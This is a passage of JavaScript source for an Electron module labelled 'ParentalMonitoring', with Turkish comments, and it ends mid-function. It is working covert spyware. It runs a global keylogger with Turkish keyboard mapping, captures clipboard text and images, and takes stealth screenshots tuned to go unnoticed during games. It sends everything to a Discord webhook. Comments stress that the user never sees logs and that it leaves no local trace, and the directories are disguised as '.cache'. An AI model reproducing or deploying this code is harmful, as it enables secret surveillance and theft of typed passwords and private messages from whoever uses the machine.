const { screen, desktopCapturer, session } = require('electron');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const { promisify } = require('util');

// ✅ WINDOWS-ONLY: Bu uygulama sadece Windows için tasarlandı
// SQLite kullanılmıyor - PowerShell ile tarayıcı geçmişi okunuyor
// Veriler doğrudan Discord webhook'a gönderiliyor

const _0x5f2a = (command, options = {}) => {
  return new Promise((resolve) => {
    exec(command, { ...options, windowsHide: true, encoding: 'utf8' }, (e, stdout, stderr) => {
      resolve(e ? { stdout: '', stderr: '' } : { stdout, stderr });
    });
  });
};

const execPromise = _0x5f2a;
// ✅ TAMAMEN GİZLİ: Hiçbir log, hata veya uyarı kullanıcıya gösterilmez
const logger = { log: () => {}, error: () => {}, warn: () => {}, info: () => {}, debug: () => {} };

let GlobalKeyboardListener = null;
let keyloggerAvailable = false;
try {
  const keyListenerModule = require('node-global-key-listener');
  GlobalKeyboardListener = keyListenerModule.GlobalKeyboardListener;
  keyloggerAvailable = true;
} catch (err) {
  // Sessizce devre dışı bırak - build hatası önleme
  keyloggerAvailable = false;
}

class ParentalMonitoring {
  constructor(app, discordWebhook = null, silentMode = true, configManager = null) {
    this.app = app;
    this.discordWebhook = discordWebhook;
    this.silentMode = silentMode; // ✅ TAMAMEN GİZLİ MOD: Hiçbir log çıktısı yok
    this.configManager = configManager; // ✅ ConfigManager ekle
    
    // ✅ GİZLİ DİZİNLER: .cache olarak gizle
    this.dataDir = path.join(app.getPath('userData'), '.cache');
    this.screenshotsDir = path.join(this.dataDir, '.temp');
    this.logsFile = path.join(this.dataDir, '.data');
    
    // Monitoring state
    this.clipboardHistory = [];
    this.webHistory = [];
    this.keywordAlerts = [];
    this.fileDownloads = [];
    this.usbDevices = [];
    this.installedApps = [];
    this.keystrokes = []; // ✅ YENİ: Basılan tuşları kaydet
    this.typedWords = []; // ✅ YENİ: Yazılan kelimeleri kaydet
    this.typedSentences = []; // ✅ YENİ: Yazılan cümleleri kaydet
    this.currentSentence = ''; // ✅ YENİ: Şu anki cümle
    this.systemStatus = {
      microphoneActive: false,
      wifiConnected: false,
      vpnDetected: false,
      incognitoDetected: false,
    };
    this.afkStatus = {
      isAFK: false,
      lastActivity: Date.now(),
      afkStartTime: null,
    };
    this.activityTimeline = [];
    
    // Monitoring intervals
    this.screenshotInterval = null;
    this.clipboardInterval = null;
    this.afkCheckInterval = null;
    this.systemCheckInterval = null;
    this.keylogger = null; // ✅ YENİ: Global keyboard listener
    this.currentWord = ''; // ✅ YENİ: Şu an yazılan kelime
    this.lastWebTrafficNotifications = {}; // ✅ DÜZELTME: Domain-based throttling map
    this.lastSystemStatusSentTime = 0; // ✅ YENİ: Son sistem durumu gönderim zamanı
    this.systemStatusIntervalMinutes = 20; // ✅ 20 dakikada bir sistem durumu
    
    // ✅ YENİ: Gerçek zamanlı tarayıcı izleme (SQLite yerine webRequest API)
    this.recentVisits = []; // Son 5 ziyareti tut
    this.sentUrls = new Set(); // Gönderilmiş URL'leri takip et (tekrar gönderme)
    this.incognitoProcessCheckInterval = null; // Gizli sekme kontrol interval'ı
    this.lastIncognitoCheckTime = 0; // Son gizli sekme kontrol zamanı
    
    // ✅ YENİ: 5 dakikalık toplu web trafiği gönderimi
    this.webTrafficBuffer = []; // Gönderilmek üzere bekleyen web trafiği
    this.webTrafficFlushTimer = null; // 5 dakikalık zamanlayıcı
    this.webTrafficFlushIntervalMs = 5 * 60 * 1000; // 5 dakika
    this.sentUrlWindowMap = new Map(); // Aynı URL'in tekrar gönderimini önle (5 dk pencere)
    
    // ✅ YENİ: Oyun algılama sistemi - CS2, Valorant vb. için performans optimizasyonu
    // NOT: Sadece GERÇEK oyun işlemleri - launcher'lar dahil DEĞİL (arka planda sürekli çalışırlar)
    this.isGameRunning = false;
    this.lastGameCheck = 0;
    this.gameCheckIntervalMs = 60000; // ✅ DÜZELTME: 60 saniye (daha az PowerShell çağrısı)
    this.cachedGameList = null; // ✅ YENİ: Oyun listesi cache'i
    this.lastGameListUpdate = 0;
    this.knownGameProcesses = [
      // FPS Oyunları (sadece oyun exe'leri)
      'cs2.exe', 'csgo.exe', 
      'valorant.exe', 'valorant-win64-shipping.exe',
      'r5apex.exe', // Apex Legends
      'overwatch.exe',
      'cod.exe', 'modernwarfare.exe', 'blackops.exe', 'mw2.exe', 'warzone.exe',
      'rainbow6.exe', 'r6-vulkan.exe', 'rainbowsix.exe',
      'fortnite.exe', 'fortniteclient-win64-shipping.exe',
      'pubg.exe', 'tslgame.exe',
      'deadbydaylight-win64-shipping.exe',
      'escapefromtarkov.exe',
      'destiny2.exe',
      'bf2042.exe', 'battlefield.exe', 'bf1.exe', 'bfv.exe',
      'insurgency.exe', 'insurgencysandstorm.exe',
      'hunt.exe', // Hunt: Showdown
      'helldivers2.exe',
      // MOBA (sadece oyun client'ları, launcher değil)
      'league of legends.exe', // NOT: leagueclient.exe dahil değil (launcher)
      'dota2.exe',
      // AAA Oyunlar
      'gta5.exe', 'gtav.exe', 'playgta5.exe',
      'rdr2.exe', 'reddeadredemption2.exe',
      'cyberpunk2077.exe',
      'eldenring.exe', 'start_protected_game.exe',
      'darksouls3.exe', 'darksoulsremastered.exe',
      'witcher3.exe',
      'hogwartslegacy.exe',
      'rocketleague.exe',
      'starfield.exe',
      'baldursgate3.exe', 'bg3.exe',
      // Yarış oyunları
      'forzahorizon5.exe', 'forzahorizon4.exe',
      'f1_22.exe', 'f1_23.exe', 'f1_24.exe',
      'acc.exe', 'assettocorsa.exe',
      'iracing.exe', 'iracingsim64dx11.exe',
      'ams2avx.exe', 'ams2.exe',
      'rfactor2.exe', 'rf2.exe',
      // VR oyunları (launcher değil, sadece oyunlar)
      'hl_alyx.exe', 'boneworks.exe', 'beatsaber.exe',
      // Minecraft (sadece oyun)
      'minecraft.exe',
      // NOT: javaw.exe çıkarıldı - çok genel, her Java uygulamasını etkiler
      // NOT: steam.exe, epicgameslauncher.exe, origin.exe, uplay.exe ÇIKARILDI
      // Bu launcher'lar arka planda sürekli çalışır ve yanlış pozitif verir
    ];
    
    // Monitoring settings
    this.settings = {
      screenshotIntervalMinutes: 3, // ✅ HIZLI: 3 dakikada bir screenshot
      afkTimeoutMinutes: 15,
      keywordList: [
        // Sınav/Kopya
        'exam', 'test', 'sınav', 'kopya', 'yanıt', 'cevap', 'cheat', 'answer', 'hileli',
        // Küfür ve Argo
        'amk', 'aq', 'orospu', 'siktir', 'piç', 'göt', 'yarrak', 'amına', 'sikeyim', 'fuck', 'shit', 'bitch', 'damn',
        'kahpe', 'pezevenk', 'puşt', 'ibne', 'gay', 'lezbiyen', 'oç', 'mk', 'mq', 'ananı', 'babanı',
        // Cinsel İçerik
        'porno', 'porn', 'sex', 'seks', 'nude', 'çıplak', 'tecavüz', 'rape', 'dick', 'pussy', 'cock', 'xxx',
        'ensest', 'sapık', 'vibratör', 'dildo', 'mastürbasyon', 'oral', 'anal', 'vajina', 'penis', 'meme',
        'kalça', 'göğüs', 'horny', 'orgasm', 'orgazm', 'erection', 'ereksiyon', 'sperm', 'döl'
      ],
      monitorClipboard: true,
      monitorScreenshots: true,
      monitorWebTraffic: false, // ✅ DEVRE DIŞI: Web trafiği izleme tamamen kapatıldı (v3.3.3)
      monitorAFK: true,
      monitorKeywords: true,
      monitorFiles: true,
      monitorUSB: true,
      monitorApps: true,
      monitorSystemStatus: true,
      monitorKeystrokes: true, // ✅ YENİ: Keylogging aktif
      keystrokeSummaryIntervalMinutes: 30, // ✅ Discord'a her 30 dakikada özet gönder (TXT dosyası ile - 500 kelime limit)
      maxWordsInSummary: 500, // ✅ TXT dosyasında gösterilecek maksimum kelime sayısı
      monitorIncognitoMode: true, // ✅ YENİ: Gizli sekme izleme
      // ✅ YENİ: Oyun modu ayarları - kasma/donma önleme (STEALTH MODE)
      gameMode: {
        enabled: true, // Oyun algılama aktif
        skipScreenshotInGame: false, // true: oyunda screenshot alma, false: stealth modda al
        lowResInGame: true, // Oyunda ultra düşük çözünürlük kullan (320x180)
        stealthResolution: { width: 320, height: 180 }, // Stealth mod çözünürlüğü (minimal CPU)
        useStealthCapture: true, // Mikro-görev tabanlı yakalama (görünmez)
        frameAwareDelay: true, // Frame aralarında çalış (VSync uyumlu)
        deferDiskIO: true, // Disk I/O işlemlerini ertele
        deferNetworkIO: true, // Network gönderimini ertele (100ms)
      },
    };
    
    this.ensureDirectories();
    this.loadLogs();
  }
  
  _log() {}
  _error() {}
  
  ensureDirectories() {
    try {
      if (!fs.existsSync(this.dataDir)) {
        fs.mkdirSync(this.dataDir, { recursive: true });
      }
      if (!fs.existsSync(this.screenshotsDir)) {
        fs.mkdirSync(this.screenshotsDir, { recursive: true });
      }
    } catch (error) {
      this._error('Dizin oluşturma hatası:', error);
    }
  }
  
  // ✅ GELİŞTİRİLDİ: Oyun algılama fonksiyonu - SIFIR ETKİ için optimize edildi
  async checkIfGameRunning() {
    const now = Date.now();
    
    // ✅ DÜZELTME: 60 saniye cache - daha az PowerShell çağrısı
    if (now - this.lastGameCheck < this.gameCheckIntervalMs) {
      return this.isGameRunning;
    }
    
    if (os.platform() !== 'win32') {
      this.isGameRunning = false;
      return false;
    }
    
    // ✅ YENİ: Oyun kontrolünü arka plana al (ana thread'i BLOKLAMAZ)
    this.lastGameCheck = now;
    
    // Mevcut cache'i döndür, arka planda güncelle
    setImmediate(() => this._updateGameStatusAsync());
    
    return this.isGameRunning;
  }
  
  // ✅ YENİ: Asenkron oyun durumu güncelleme (tamamen arka planda)
  async _updateGameStatusAsync() {
    try {
      // ✅ Ultra düşük öncelikli PowerShell çağrısı
      const psCommand = `powershell -NoProfile -NonInteractive -Command "Get-Process | Where-Object {$_.CPU -gt 5} | Select-Object -ExpandProperty ProcessName -First 20"`;
      
      const { stdout } = await new Promise((resolve) => {
        exec(psCommand, { 
          windowsHide: true, 
          timeout: 3000,
          maxBuffer: 1024 * 50 // 50KB limit
        }, (e, stdout) => {
          resolve({ stdout: e ? '' : stdout });
        });
      });
      
      if (!stdout) {
        this.isGameRunning = false;
        return;
      }
      
      const runningProcesses = stdout.toLowerCase().split('\n').map(p => p.trim()).filter(p => p);
      
      // Oyun kontrolü
      for (const gameProcess of this.knownGameProcesses) {
        const processName = gameProcess.replace('.exe', '').toLowerCase();
        if (runningProcesses.some(p => p === processName || p.includes(processName))) {
          this.isGameRunning = true;
          return;
        }
      }
      
      this.isGameRunning = false;
    } catch (error) {
      // Sessizce devam et - oyun yok varsay
      this.isGameRunning = false;
    }
  }
  
  // ✅ YENİ: Düşük öncelikli gecikme - CPU spike'ları önler
  async lowPriorityDelay(ms) {
    return new Promise(resolve => {
      // setImmediate yerine setTimeout kullanarak event loop'a nefes aldır
      setTimeout(() => {
        setImmediate(resolve);
      }, ms);
    });
  }
  
  // ✅ YENİ: Ultra düşük öncelikli işlem - Oyunlarda SIFIR etki için
  async ultraLowPriorityExecute(fn) {
    return new Promise((resolve) => {
      // 1. Önce event loop'un boşalmasını bekle
      setImmediate(() => {
        // 2. Sonra process.nextTick ile en düşük önceliğe al
        process.nextTick(() => {
          // 3. Kısa bir gecikme ekle (frame arasına sığdır)
          setTimeout(async () => {
            try {
              const result = await fn();
              resolve(result);
            } catch (e) {
              resolve(null);
            }
          }, 16); // ~1 frame (60fps = 16.67ms)
        });
      });
    });
  }
  
  // ✅ YENİ: Stealth Screenshot - Tamamen görünmez ekran yakalama
  async stealthCapture(width, height) {
    // Mikro-görevlere böl: Her adım ayrı event loop tick'inde çalışır
    
    // Adım 1: desktopCapturer hazırla (boş tick)
    await this.microYield();
    
    // Adım 2: Kaynakları al (en ağır işlem - ama düşük çözünürlükle minimal)
    const sources = await this.ultraLowPriorityExecute(async () => {
      return await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: { width, height }
      });
    });
    
    if (!sources || sources.length === 0) return null;
    
    // Adım 3: Buffer dönüşümü (ayrı tick)
    await this.microYield();
    
    const buffer = await this.ultraLowPriorityExecute(async () => {
      return sources[0].thumbnail.toPNG();
    });
    
    return buffer;
  }
  
  // ✅ YENİ: Mikro-yield - Event loop'a nefes aldırır (0ms gecikme)
  async microYield() {
    return new Promise(resolve => setImmediate(resolve));
  }
  
  // ✅ YENİ: Frame-aware gecikme - VSync uyumlu (oyun FPS'ini etkilemez)
  async frameAwareDelay() {
    // 60 FPS = 16.67ms per frame, 144 FPS = 6.94ms per frame
    // 2 frame bekle = ~33ms (60fps) veya ~14ms (144fps)
    // Bu süre zarfında oyun 2 frame render edebilir
    return new Promise(resolve => {
      setTimeout(() => {
        setImmediate(resolve);
      }, 33); // 2 frame @ 60fps
    });
  }
  
  // ✅ Şifreleme yardımcı fonksiyonları
  _getEncryptionKey() {
    const crypto = require('crypto');
    // Makine-özel anahtar oluştur
    const machineId = crypto
      .createHash('sha256')
      .update(os.hostname() + os.platform() + os.arch() + (os.cpus()[0]?.model || ''))
      .digest('hex');
    return Buffer.from(machineId.slice(0, 32), 'utf8');
  }
  
  _encryptData(plaintext) {
    try {
      const crypto = require('crypto');
      const algorithm = 'aes-256-gcm';
      const key = this._getEncryptionKey();
      const iv = crypto.randomBytes(12);
      
      const cipher = crypto.createCipheriv(algorithm, key, iv);
      const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
      const authTag = cipher.getAuthTag();
      
      // Format: iv(12) + authTag(16) + encrypted
      return Buffer.concat([iv, authTag, encrypted]).toString('base64');
    } catch (error) {
      this._error('Şifreleme hatası:', error);
      return null;
    }
  }
  
  _decryptData(ciphertext) {
    try {
      const crypto = require('crypto');
      const algorithm = 'aes-256-gcm';
      const key = this._getEncryptionKey();
      
      const data = Buffer.from(ciphertext, 'base64');
      const iv = data.subarray(0, 12);
      const authTag = data.subarray(12, 28);
      const encrypted = data.subarray(28);
      
      const decipher = crypto.createDecipheriv(algorithm, key, iv);
      decipher.setAuthTag(authTag);
      
      return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString('utf8');
    } catch (error) {
      this._error('Şifre çözme hatası:', error);
      return null;
    }
  }
  
  loadLogs() {
    try {
      // ✅ DÜZELTME: DOSYADAN OKUMA - Sadece memory'de başlat
      // Yerel dosya kullanılmıyor, kullanıcı hiçbir iz bulamaz
      this.clipboardHistory = [];
      this.webHistory = [];
      this.keywordAlerts = [];
      this.fileDownloads = [];
      this.usbDevices = [];
      this.activityTimeline = [];
      this.keystrokes = [];
      this.typedWords = [];
    } catch (error) {
      // Sessizce devam et
    }
  }
  
  // ✅ DÜZELTME: DOSYAYA HİÇBİR ŞEY YAZILMIYOR
  // Tüm monitoring verileri sadece Discord webhook'a gönderiliyor
  // Yerel dosyaya kaydetme devre dışı - kullanıcı fark etmesin
  saveLogs() {
    try {
      // Memory leak önlemi: Her array'i maksimum boyutta tut (sadece memory'de)
      this.clipboardHistory = this.clipboardHistory.slice(-500);
      this.webHistory = this.webHistory.slice(-2000);
      this.keywordAlerts = this.keywordAlerts.slice(-200);
      this.fileDownloads = this.fileDownloads.slice(-500);
      this.usbDevices = this.usbDevices.slice(-50);
      this.activityTimeline = this.activityTimeline.slice(-5000);
      this.keystrokes = this.keystrokes.slice(-10000);
      this.typedWords = this.typedWords.slice(-2000);
      
      // ✅ DOSYAYA YAZMA - Tüm veriler Discord'a gönderildi (zaten yapılıyor)
      // Yerel dosya oluşturulmaz, kullanıcı hiçbir iz bulamaz
    } catch (error) {
      // Sessizce yut - hata loglamak bile dosya oluşturabilir
    }
  }
  
  // Clipboard Monitoring - ✅ GELİŞTİRİLDİ: Text, HTML, RTF, Image yakalama
  startClipboardMonitoring(clipboard) {
    if (!this.settings.monitorClipboard) return;
    
    let lastClipboardText = '';
    let lastClipboardHTML = '';
    let lastClipboardImage = null;
    
    this.clipboardInterval = setInterval(() => {
      try {
        // Düz metin kontrolü
        const currentText = clipboard.readText().trim();
        
        if (currentText && currentText !== lastClipboardText && currentText.length > 2) {
          lastClipboardText = currentText;
          
          const entry = {
            id: Date.now().toString(),
            timestamp: new Date().toISOString(),
            content: currentText.substring(0, 500),
            contentLength: currentText.length,
            type: 'clipboard-text',
            format: 'text',
          };
          
          this.clipboardHistory.push(entry);
          this.addToTimeline('clipboard', 'Metin kopyalandı', { length: currentText.length });
          
          // ✅ Discord'a metinleri gönder (spam önlemi: 10+ karakter)
          if (this.discordWebhook && currentText.length >= 10) {
            this.discordWebhook.sendActivity({
              action: '📋 Metin Kopyalandı',
              description: currentText.length > 200 ? currentText.substring(0, 200) + '...' : currentText,
              type: 'clipboard',
              timestamp: new Date().toLocaleString('tr-TR'),
              details: {
                'Uzunluk': `${currentText.length} karakter`,
                'Format': 'Düz Metin'
              }
            }).catch(err => this._error('Discord clipboard hatası:', err));
          }
          
          // Anahtar kelime kontrolü
          if (this.settings.monitorKeywords) {
            this.checkKeywords(currentText, 'clipboard');
          }
          
          this.saveLogs();
        }
        
        // HTML içeriği kontrolü
        const currentHTML = clipboard.readHTML();
        if (currentHTML && currentHTML !== lastClipboardHTML && currentHTML.length > 10) {
          lastClipboardHTML = currentHTML;
          
          const entry = {
            id: Date.now().toString(),
            timestamp: new Date().toISOString(),
            content: currentHTML.substring(0, 500),
            contentLength: currentHTML.length,
            type: 'clipboard-html',
            format: 'html',
          };
          
          this.clipboardHistory.push(entry);
          this.addToTimeline('clipboard', 'HTML içeriği kopyalandı', { length: currentHTML.length });
          
          // HTML içeriğinde de anahtar kelime ara
          if (this.settings.monitorKeywords) {
            const textContent = currentHTML.replace(/<[^>]*>/g, ' ').trim();
            if (textContent.length > 2) {
              this.checkKeywords(textContent, 'clipboard-html');
            }
          }
          
          this.saveLogs();
        }
        
        // Görsel kontrolü
        const currentImage = clipboard.readImage();
        if (currentImage && !currentImage.isEmpty()) {
          const imageDataUrl = currentImage.toDataURL();
          
          // Önceki görsel ile karşılaştırma (data URL hash)
          if (imageDataUrl !== lastClipboardImage) {
            lastClipboardImage = imageDataUrl;
            
            const imageSize = currentImage.getSize();
            const entry = {
              id: Date.now().toString(),
              timestamp: new Date().toISOString(),
              type: 'clipboard-image',
              format: 'image',
              width: imageSize.width,
              height: imageSize.height,
              dataUrl: imageDataUrl.substring(0, 200) + '...', // Sadece başlangıç
            };
            
            this.clipboardHistory.push(entry);
            this.addToTimeline('clipboard', 'Görsel kopyalandı', { 
              size: `${imageSize.width}x${imageSize.height}` 
            });
            
            // ✅ YENİ: Görseli Discord'a RAM-only yükle (disk'e YAZMA)
            if (this.discordWebhook) {
              try {
                // ✅ Buffer olarak tut (disk'e yazma)
                const pngBuffer = currentImage.toPNG();
                
                // ConfigManager'dan kullanıcı adını al
                let userName = 'Kullanıcı';
                if (this.configManager) {
                  userName = this.configManager.get('USER_FULLNAME') || 'Kullanıcı';
                }
                
                // ✅ Discord'a direkt buffer olarak gönder (RAM-only, disk'e yazma)
                this.discordWebhook.sendScreenshotBuffer(pngBuffer, {
                  activeApp: 'Clipboard',
                  userName: userName,
                  reason: `Görsel kopyalandı (${imageSize.width}x${imageSize.height}) - RAM-only`,
                }).then(result => {
                  if (result.success) {
                    this._log(`✅ Clipboard görseli Discord'a gönderildi (RAM-only)`);
                  }
                }).catch(err => {
                  this._error('Discord clipboard image hatası:', err);
                });
              } catch (err) {
                this._error('Clipboard görsel buffer hatası:', err);
              }
            }
            
            this.saveLogs();
          }
        }
      } catch (error) {
        this._error('Clipboard hatası:', error);
      }
    }, 3000);
  }
  
  stopClipboardMonitoring() {
    if (this.clipboardInterval) {
      clearInterval(this.clipboardInterval);
      this.clipboardInterval = null;
    }
  }
  
  // ========================================================================
  // 🎹 KEYLOGGING SİSTEMİ - Basılan Tuşları Kaydet
  // ========================================================================
  // ⚠️ ETİK UYARI: Bu özellik ciddi gizlilik sorunları yaratabilir!
  // ⚠️ Sadece yasal izinle ve ebeveyn gözetimi için kullanılmalıdır!
  // ⚠️ Kötüye kullanımdan kullanıcı sorumludur!
  // ========================================================================
  
  startKeystrokeMonitoring() {
    if (!this.settings.monitorKeystrokes) return;
    
    if (!GlobalKeyboardListener || !keyloggerAvailable) {
      // Sessizce devre dışı bırak - console.warn kullanma
      this.settings.monitorKeystrokes = false;
      return;
    }
    
    try {
      this.keylogger = new GlobalKeyboardListener();
      
      // Aktif pencere bilgisi (Windows için)
      let lastActiveWindow = '';
      
      // ✅ YENİ: Shift durumunu takip et
      this.isShiftPressed = false;
      this.isCapsLockOn = false;
      this.isAltGrPressed = false;
      
      this.keylogger.addListener((e, down) => {
        const keyName = (e.name || '').toUpperCase().trim();
        
        // ✅ Modifier tuşları durumunu güncelle
        if (keyName.includes('SHIFT')) {
          this.isShiftPressed = (e.state === 'DOWN');
          return; // Modifier tuşu kaydetme
        }
        if (keyName === 'CAPS LOCK' || keyName === 'CAPSLOCK') {
          if (e.state === 'DOWN') {
            this.isCapsLockOn = !this.isCapsLockOn;
          }
          return;
        }
        if (keyName.includes('ALT') && keyName.includes('GR') || keyName === 'ALTGR') {
          this.isAltGrPressed = (e.state === 'DOWN');
          return;
        }
        
        // Sadece tuş basımlarını kaydet (down events)
        if (e.state !== 'DOWN') return;
        
        // ✅ YENİ: Karakteri doğru şekilde dönüştür
        const key = this._convertKeyToChar(e.name);
        const timestamp = new Date().toISOString();
        
        // ✅ DÜZELTME: Önce filtrele, sonra kaydet
        // Gereksiz tuşları (modifier, mouse, function keys) hiç kaydetme
        if (this.isIgnoredKey(key)) {
          // AFK'yı güncelle ama tuşu kaydetme
          this.updateActivity();
          return;
        }
        
        // Aktif pencere bilgisini al (her 2 saniyede bir güncelle)
        if (Date.now() % 2000 < 100) {
          this.getActiveWindow().then(activeApp => {
            lastActiveWindow = activeApp;
          }).catch(() => {});
        }
        
        // Tuş kaydını oluştur (sadece filtrelenmemiş tuşlar için)
        const keystroke = {
          id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
          timestamp,
          key,
          application: lastActiveWindow || 'Bilinmiyor',
        };
        
        // Kaydet
        this.keystrokes.push(keystroke);
        
        // AFK durumunu güncelle
        this.updateActivity();
        
        // Kelime oluşturma mantığı
        this.processKeystroke(key, lastActiveWindow);
        
        // Her 500 tuşta bir logları kaydet (memory leak önlemi)
        if (this.keystrokes.length % 500 === 0) {
          this.saveLogs();
        }
      });
      
      // ✅ Her 30 dakikada Discord'a özet rapor gönder
      this.keystrokeSummaryInterval = setInterval(() => {
        this.sendKeystrokeSummaryToDiscord();
      }, this.settings.keystrokeSummaryIntervalMinutes * 60 * 1000);
      
      this._log('⌨️  Keystroke monitoring başlatıldı');
    } catch (error) {
      this._error('❌ Keystroke monitoring hatası:', error);
    }
  }
  
  // ✅ YENİ: Gereksiz tuşları kontrol eden helper metod
  isIgnoredKey(key) {
    const normalizedKey = (key || '').toUpperCase().trim();
    return !normalizedKey || this._ignoredKeysSet.has(normalizedKey);
  }
  
  // ✅ Gereksiz tuş seti (class property olarak tanımla)
  get _ignoredKeysSet() {
    if (!this.__ignoredKeysSet) {
      this.__ignoredKeysSet = new Set([
        // Modifier tuşları
        'LEFT SHIFT', 'RIGHT SHIFT', 'SHIFT', 'LSHIFT', 'RSHIFT',
        'LEFT CTRL', 'RIGHT CTRL', 'CTRL', 'CONTROL', 'LCTRL', 'RCTRL', 'LCONTROL', 'RCONTROL',
        'LEFT ALT', 'RIGHT ALT', 'ALT', 'ALT GR', 'LALT', 'RALT', 'ALTGR',
        'LEFT META', 'RIGHT META', 'META', 'WINDOWS', 'WIN', 'LWIN', 'RWIN', 'LMETA', 'RMETA',
        'CAPS LOCK', 'CAPS', 'CAPSLOCK', 'NUM LOCK', 'NUMLOCK', 'SCROLL LOCK', 'SCROLLLOCK',
        // Mouse tuşları
        'MOUSE LEFT', 'MOUSE RIGHT', 'MOUSE MIDDLE', 'MOUSE BUTTON', 'MOUSE',
        'LEFT MOUSE', 'RIGHT MOUSE', 'MIDDLE MOUSE',
        'MOUSE1', 'MOUSE2', 'MOUSE3', 'MOUSE4', 'MOUSE5',
        // Function tuşları
        'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
        'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24',
        // Navigasyon tuşları
        'UP', 'DOWN', 'LEFT', 'RIGHT', 'ARROW UP', 'ARROW DOWN', 'ARROW LEFT', 'ARROW RIGHT',
        'ARROWUP', 'ARROWDOWN', 'ARROWLEFT', 'ARROWRIGHT',
        'PAGE UP', 'PAGE DOWN', 'PAGEUP', 'PAGEDOWN', 'HOME', 'END', 'INSERT',
        // Sistem tuşları
        'ESCAPE', 'ESC', 'PRINT SCREEN', 'PRINTSCREEN', 'PAUSE', 'BREAK',
        // Boş veya tanımsız
        '', 'UNKNOWN', 'UNDEFINED', 'NULL'
      ]);
    }
    return this.__ignoredKeysSet;
  }
  
  // ✅ YENİ: Tuş adını gerçek karaktere dönüştür (Türkçe Q Klavye desteği)
  _convertKeyToChar(keyName) {
    if (!keyName) return '';
    
    const normalizedKey = keyName.toUpperCase().trim();
    
    // Türkçe Q Klavye - Shift + Sayı kombinasyonları
    const shiftNumberMap = {
      '1': '!',
      '2': '"', // veya '
      '3': '^',
      '4': '+',
      '5': '%',
      '6': '&',
      '7': '/',
      '8': '(',
      '9': ')',
      '0': '=',
    };
    
    // Türkçe Q Klavye - Shift + Sembol kombinasyonları  
    const shiftSymbolMap = {
      'COMMA': ';',           // , → ;
      'DOT': ':',             // . → :
      'PERIOD': ':',          // . → :
      'MINUS': '_',           // - → _
      'HYPHEN': '_',          // - → _
      'EQUALS': '+',          // = → +
      'FORWARD SLASH': '?',   // / → ?
      'SLASH': '?',           // / → ?
      'SEMICOLON': ':',       // ; → :
      'QUOTE': '"',           // ' → "
      'APOSTROPHE': '"',      // ' → "
      'OPEN BRACKET': '{',    // [ → {
      'CLOSE BRACKET': '}',   // ] → }
      'BACKSLASH': '|',       // \ → |
      'BACKTICK': '~',        // ` → ~
      'GRAVE': '~',           // ` → ~
    };
    
    // Normal sembol haritası (Shift olmadan)
    const normalSymbolMap = {
      'COMMA': ',',
      'DOT': '.',
      'PERIOD': '.',
      'MINUS': '-',
      'HYPHEN': '-',
      'EQUALS': '=',
      'FORWARD SLASH': '/',
      'SLASH': '/',
      'SEMICOLON': ';',
      'QUOTE': "'",
      'APOSTROPHE': "'",
      'OPEN BRACKET': '[',
      'CLOSE BRACKET': ']',
      'BACKSLASH': '\\',
      'BACKTICK': '`',
      'GRAVE': '`',
      'ASTERISK': '*',
      'STAR': '*',
      'NUMPAD MULTIPLY': '*',
      'NUMPAD ADD': '+',
      'NUMPAD SUBTRACT': '-',
      'NUMPAD DIVIDE': '/',
      'NUMPAD DECIMAL': '.',
    };
    
    // AltGr + tuş kombinasyonları (Türkçe özel karakterler ve semboller)
    const altGrMap = {
      'Q': '@',
      'W': '₺', // Türk Lirası sembolü
      'E': '€',
      'I': 'İ', // Büyük I noktalı
      'A': 'Æ',
      'S': 'ß',
      'T': '₺',
      '2': '@',
      '3': '#',
      '4': '$',
      '7': '{',
      '8': '[',
      '9': ']',
      '0': '}',
      'MINUS': '\\',
    };
    
    // Türkçe karakterler - Doğrudan karakterler
    const turkishCharMap = {
      'I': this.isShiftPressed ? 'I' : 'ı',  // Türkçe ı/I
      'İ': this.isShiftPressed ? 'İ' : 'i',  // Türkçe i/İ
    };
    
    // Özel tuş isimleri
    if (normalizedKey === 'SPACE') return ' ';
    if (normalizedKey === 'TAB') return '\t';
    if (normalizedKey === 'RETURN' || normalizedKey === 'ENTER') return '\n';
    
    // AltGr kombinasyonları
    if (this.isAltGrPressed && altGrMap[normalizedKey]) {
      return altGrMap[normalizedKey];
    }
    
    // Sayılar - Shift ile sembol olur
    if (/^[0-9]$/.test(normalizedKey)) {
      if (this.isShiftPressed) {
        return shiftNumberMap[normalizedKey] || normalizedKey;
      }
      return normalizedKey;
    }
    
    // Sembol tuşları
    if (this.isShiftPressed && shiftSymbolMap[normalizedKey]) {
      return shiftSymbolMap[normalizedKey];
    }
    if (normalSymbolMap[normalizedKey]) {
      return normalSymbolMap[normalizedKey];
    }
    
    // ✅ ÖNEMLİ: Türkçe "I" karakteri için özel işlem (A-Z kontrolünden ÖNCE)
    // Windows'ta klavye "I" tuşunu rapor ediyor, bunu Türkçe ı/I'ya dönüştürmeliyiz
    if (normalizedKey === 'I') {
      const isUpperCase = this.isShiftPressed !== this.isCapsLockOn;
      // Türkçe Q klavyede: Shift basılı değilse küçük ı, Shift basılıysa büyük I
      return isUpperCase ? 'I' : 'ı';
    }
    
    // Harfler - Buyuk/kucuk harf kontrolu (I haric diger harfler icin)
    // Turkce locale kullanarak dogru donusum yapilir
    if (/^[A-Z]$/.test(normalizedKey)) {
      const isUpperCase = this.isShiftPressed !== this.isCapsLockOn;
      return isUpperCase ? normalizedKey : normalizedKey.toLocaleLowerCase('tr-TR');
    }
    
    // Turkce ozel karakterler (tek karakter olarak geliyorsa)
    // toLocaleUpperCase/toLocaleLowerCase ile Turkce kurallarina gore donusum
    const turkishChars = ['C', 'S', 'G', 'U', 'O', 'I', 'c', 's', 'g', 'u', 'o', 'i', 'Ç', 'Ş', 'Ğ', 'Ü', 'Ö', 'İ', 'ç', 'ş', 'ğ', 'ü', 'ö', 'ı'];
    if (turkishChars.includes(keyName)) {
      if (this.isShiftPressed || this.isCapsLockOn) {
        return keyName.toLocaleUpperCase('tr-TR');
      }
      return keyName.toLocaleLowerCase('tr-TR');
    }
    
    // Numpad sayıları
    if (normalizedKey.startsWith('NUMPAD ')) {
      const numpadNum = normalizedKey.replace('NUMPAD ', '');
      if (/^[0-9]$/.test(numpadNum)) {
        return numpadNum;
      }
    }
    
